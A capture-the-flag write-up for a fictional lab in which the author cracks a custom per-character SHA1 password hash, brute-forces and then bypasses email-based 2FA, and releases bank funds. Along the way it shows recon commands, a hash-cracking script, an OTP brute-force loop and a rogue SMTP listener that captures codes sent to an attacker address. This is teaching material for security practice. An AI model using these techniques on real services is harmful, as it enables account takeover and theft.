# Hopper the Detective — Write-up

## Objective

Sir BreachBlocker has been captured, but the final key needed to recover the stolen AoC charity funds is hidden somewhere on his phone. Hopper must compromise the device, bypass the authentication layers, and recover the final key before King Malhare's cronies move the funds.

The challenge involves discovering three flags:

- **CODE_FLAG**
- **HOPFLIX_FLAG**
- **BANK_FLAG**

---

## Initial Recon

```bash
nmap -sS -sV -sC --append-output 10.81.152.140
```

```
22/tcp    open  ssh
25/tcp    open  smtp
8443/tcp  open  https (nginx)
```

The interesting service was the web application running on port `8443`.

```bash
gobuster dir -w raft-medium-words.txt -u https://10.80.178.75:8443 -x php,html,txt,py,js -k
```

```
/index.html
/main.py
/main.js
/requirements.txt
```

---

## Web Enumeration

The JavaScript file (`main.js`) immediately stood out because it contained useful information:

```javascript
const PHONE_PASSCODE = "210701";

document.getElementById('streamingEmail').value =
'sbreachblocker@easterbunnies.thm';

POST /api/check-credentials
GET  /api/get-last-viewed

POST /api/bank-login
POST /api/send-2fa
POST /api/verify-2fa
POST /api/release-funds
```

The exposed phone passcode was:

**Passcode:** `210701`

---

## Finding the CODE_FLAG

Inspecting `main.py` revealed the first flag:

**Flag:** `THM{eggs######_code}`

Inside the source code, I also found a downloadable Hopflix database, retrieved with:

```bash
curl -k -O https://10.80.178.75:8443/hopflix-874297.db
```

Opening it with SQLite:

```bash
sqlite3 hopflix-874297.db
```

```sql
.tables
```

```
users
```

```sql
SELECT * FROM users;
```

```
sbreachblocker@easterbunnies.thm | Sir BreachBlocker | 03c96ceff1a9758a1ea7c3cb8d432646...
```

The password hash was stored using a custom hashing method.

---

## Cracking the Hopflix Password

Looking through the source code revealed that the password was hashed character-by-character:

```python
for ch in pwd:
    ch_hash = hopper_hash(ch)

    if ch_hash != phash[:40]:
        return jsonify({'valid':False,
        'error':'Incorrect Password'})

    phash = phash[40:]
```

Each character was individually hashed using SHA1, repeated 1000 times. I wrote a script to reverse each character:

```python
import hashlib

hash = "03c96ceff1a9758a1ea7c3cb8d432646..."

characters = (
    "qwertyuiopasdfghjklzxcvbnm"
    "QWERTYUIOPASDFGHJKLZXCVBNM"
    "!@#$*_-"
)

def decode(value):
    result = value

    for _ in range(1000):
        result = hashlib.sha1(
            result.encode()
        ).hexdigest()

    return result


for i in range(0, len(hash), 40):
    char_hash = hash[i:i+40]

    for char in characters:
        if decode(char) == char_hash:
            print(char, end="")

print()
```

This recovered the Hopflix password:

**Password:** `malharerocks`

Logging into Hopflix revealed the next flag:

**Flag:** `THM{fluffier_th######_4}`

---

## Attacking the Bank Authentication

Using the same credentials on the Hopsec banking application brought me to a two-factor authentication page. The API endpoints discovered earlier were useful:

```
POST /api/send-2fa
POST /api/verify-2fa
POST /api/release-funds
```

Initially, I attempted to brute force the OTP:

```python
for i in range(100000, 1000000):
    otp = f"{i:06d}"
```

However, this was extremely slow and appeared to be the wrong approach.

---

## Intercepting the 2FA Code

Looking deeper into the application, I noticed that the OTP was being sent through email. Instead of brute forcing the code, I set up an SMTP listener:

```bash
sudo python3 -m aiosmtpd -n -l 0.0.0.0:25
```

Then, during the 2FA setup, I changed the email address to point to my attacking machine:

```
attacker@[ATTACKING_IP].easterbunnies.thm
```

When the application generated the OTP, it was sent directly to my SMTP listener. This revealed the valid 2FA code, allowing me to authenticate successfully.

---

## Recovering the BANK_FLAG

After completing authentication, I was able to access the final endpoint:

```
POST /api/release-funds
```

**Flag:** `THM{neg######e}`

---

## Summary

- **Recon:** Nmap revealed SSH, SMTP, and an HTTPS web app on port 8443. Gobuster uncovered exposed source files (`main.py`, `main.js`) alongside the site itself.
- **Source leak:** The exposed `main.js` file leaked a hardcoded phone passcode, a target email address, and the full API surface (`CODE_FLAG`).
- **Hopflix DB:** `main.py` referenced a downloadable SQLite database containing a custom, character-by-character SHA1 hash of the Hopflix password.
- **Cracking the hash:** Because each character was hashed independently rather than as a whole string, the password could be brute-forced one character at a time, recovering `malharerocks` and the `HOPFLIX_FLAG`.
- **Bank login → 2FA:** The same credentials worked on the banking app, which then required a one-time passcode. Straight brute-forcing the OTP was impractical.
- **2FA bypass:** The OTP was delivered by email to an attacker-controllable address. Standing up a rogue SMTP listener and redirecting the OTP there captured the code directly, bypassing the second factor entirely.
- **Funds released:** With the OTP in hand, `/api/release-funds` was reachable, yielding the final `BANK_FLAG`.

**Key takeaways:** the box relied on leaked client-side source code, a homegrown cryptographic scheme that could be attacked piecemeal, and an OTP delivery channel that trusted attacker-supplied input — none of which required exotic exploits, just careful enumeration and reading the client-side code closely.
